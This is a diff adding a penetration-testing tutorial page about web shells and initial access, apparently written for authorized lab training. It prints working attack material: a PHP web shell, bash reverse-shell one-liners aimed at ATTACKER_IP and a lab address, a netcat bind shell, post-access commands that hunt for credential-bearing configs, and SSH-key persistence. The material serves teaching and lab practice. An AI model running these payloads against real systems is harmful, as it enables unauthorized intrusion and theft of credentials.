@@ -1,0 +1,171 @@
+---
+title: Web Shells & Initial Access
+description: Turning web code execution into a foothold — web shells, reverse and bind shells, listeners, shell stabilization, and the first steps after you land on a target in an authorized lab.
+section: web
+phase: 3
+order: 12
+difficulty: advanced
+draft: false
+tags: ['web-shell', 'reverse-shell', 'bind-shell', 'listener', 'initial-access', 'stabilization']
+updated: 2026-08-08
+---
+
+import Alert from '../../../components/ui/Alert.astro';
+import Badge from '../../../components/ui/Badge.astro';
+import CodeBlock from '../../../components/ui/CodeBlock.astro';
+import SourceTag from '../../../components/ui/SourceTag.astro';
+
+## The goal of this guide
+
+Earlier guides delivered **code execution** through a web vulnerability — SQL injection's `--os-shell`, a file-upload web shell, LFI-to-RCE, or command injection. This guide turns that *single* command execution into an **interactive foothold** and tells you what to do in the first minutes after you land.
+
+<Alert variant="danger" title="Authorized environments only">
+  Every technique here — reverse shells, bind shells, listeners — is for **your own lab VMs, CTF boxes, or explicitly authorized targets**. Confirm scope before ever connecting a shell. On the eCPPTv3 path these exercises are run in the provided training range.
+</Alert>
+
+## The web shell concept
+
+A web shell is a script dropped on the server that executes commands when requested. It is your *first* execution — usually ugly, single-command, and visible:
+
+<CodeBlock
+  lang="php"
+  title="Minimal PHP web shell (lab)"
+  code={`<?php echo shell_exec($_GET['c']); ?>
+`}
+/>
+
+<CodeBlock
+  lang="bash"
+  title="Using it"
+  code={`curl "http://10.10.10.42/uploads/shell.php?c=id"
+`}
+/>
+
+- **Purpose:** confirm execution and have a simple command channel.
+- **Expected result:** `uid=33(www-data)...`.
+- **Investigate next:** upgrade to an interactive shell — a web shell is a starting point, not a destination.
+
+## Reverse shell
+
+The target connects **out to your machine**. You listen; the target dials in.
+
+<CodeBlock
+  lang="bash"
+  title="Step 1 — start the listener on YOUR machine"
+  code={`nc -lvnp 4444
+`}
+/>
+
+<CodeBlock
+  lang="text"
+  title="Step 2 — trigger a reverse shell on the target"
+  code={`# classic bash one-liner (linux target, lab only)
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+
+# often sent through the web shell or injection:
+?c=bash+-i+>&+/dev/tcp/10.10.14.5/4444+0>&1
+`}
+/>
+
+- **Purpose:** an interactive shell that survives the web request.
+- **Expected result:** a prompt on your `nc` listener.
+- **Investigate next:** stabilize the shell (below); note the target's user/OS immediately.
+
+## Bind shell
+
+The target opens a port and **you connect to it**.
+
+<CodeBlock
+  lang="bash"
+  title="Bind shell (lab only)"
+  code={`# on target (via web shell or injection):
+nc -lvnp 4444 -e /bin/bash
+
+# on your machine:
+nc 10.10.10.42 4444
+`}
+/>
+
+- **Purpose:** useful when the target cannot reach you (egress filtering), but you can reach it.
+- **Expected result:** a shell prompt after connecting to the target's port.
+- **Investigate next:** consider SSH tunnelling if the port must survive; see [Pivoting & Port Forwarding](/guides/pivoting) in a later phase.
+
+<Alert variant="warning" title="Which to prefer">
+  Reverse shells are usually easier (firewalls often allow outbound). Prefer reverse unless the target's outbound traffic is blocked. In the exam-style lab both are common practice.
+</Alert>
+
+## The listener concept
+
+A listener is just a process waiting for a connection. `nc -lvnp PORT` is the workhorse; for a reliable production-style reverse shell, upgrade to `socat` or a Metasploit multi/handler as the workflow matures:
+
+<CodeBlock
+  lang="bash"
+  title="A more reliable listener"
+  code={`socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+`}
+/>
+
+- **Purpose:** a stable, interactive listener that handles PTY well.
+- **Expected result:** a proper shell with job control.
+- **Investigate next:** pair with payloads that return a PTY (see stabilization).
+
+## Stabilizing shells
+
+The first shell is usually a cramped, non-interactive mess (no history, no `clear`, arrows break). Make it usable:
+
+<CodeBlock
+  lang="text"
+  title="Linux stabilization sequence"
+  code={`1. python3 -c 'import pty; pty.spawn("/bin/bash")'
+2. (background the shell with Ctrl+Z)
+3. stty raw -echo; fg
+4. export TERM=xterm-256color
+5. resize to match your window (stty rows/cols)
+`}
+/>
+
+- **Purpose:** turn a dumb shell into a full terminal you can work in.
+- **Expected result:** arrow keys, history, and `clear` work.
+- **Investigate next:** an interactive shell enables the enumeration commands of the next phase.
+
+## First steps after obtaining access
+
+The first minutes set up everything after. Do these, in order, before anything fancy:
+
+1. **Confirm identity** — `id`, `whoami`, `hostname`, `uname -a`.
+2. **Confirm connectivity** — can you reach the internet/lab network? `ip a` / `ipconfig`.
+3. **Record the foothold** — how you got in, the exact request/payload, the user, the IPs. Your report and later phases depend on it.
+4. **Look for the obvious** — home directories, webroot files, configs with credentials, world-readable files (see [Linux Privilege Escalation](/guides/linux-privesc) for the systematic version).
+5. **Establish persistence-ish access** — a second way back (e.g., an SSH key you create **only in the lab**), so one lost shell does not restart the phase.
+6. **Do not go straight to root** — gather, then escalate methodically (next phases).
+
+<CodeBlock
+  lang="bash"
+  title="The first 60 seconds"
+  code={`id && whoami && hostname && uname -a
+ip a | head -20
+ls -la /home /var/www 2>/dev/null
+find / -maxdepth 3 -name '*.conf' -o -name 'config.php' 2>/dev/null | head -20
+`}
+/>
+
+- **Purpose:** baseline who/where/what before acting.
+- **Expected result:** user, OS, IPs, and a first glance at interesting files.
+- **Investigate next:** hand the results to [privilege escalation](/roadmap#phase-5) methodology.
+
+## Common mistakes
+
+- **Going for a shell before confirming execution** with `id` — you cannot fix a broken payload blindly.
+- **Starting a listener after triggering the shell** — listen first, then trigger.
+- **Skipping stabilization** and fighting a broken terminal for the whole session.
+- **Not recording how you got in** — losing the foothold chain breaks the report.
+- **Running root-seeking exploits immediately** — enumerate first; the lab's answer is usually in configs and files, not in exploits.
+- **Forgetting the shell connects to YOUR machine** — check `ATTACKER_IP` is your address, not the target's.
+
+## Related guides
+
+- [Command Injection](/guides/web/command-injection) — the sink that often delivers the shell.
+- [File Upload Vulnerabilities](/guides/web/file-upload-vulnerabilities) — the other common delivery route.
+- [Local & Remote File Inclusion](/guides/web/local-remote-file-inclusion) — LFI-to-RCE as a delivery route.
+- [Exploitation](/guides/exploitation) — the next section continues from the foothold.
+- [Privilege Escalation](/roadmap#phase-5) — what you do after initial access.
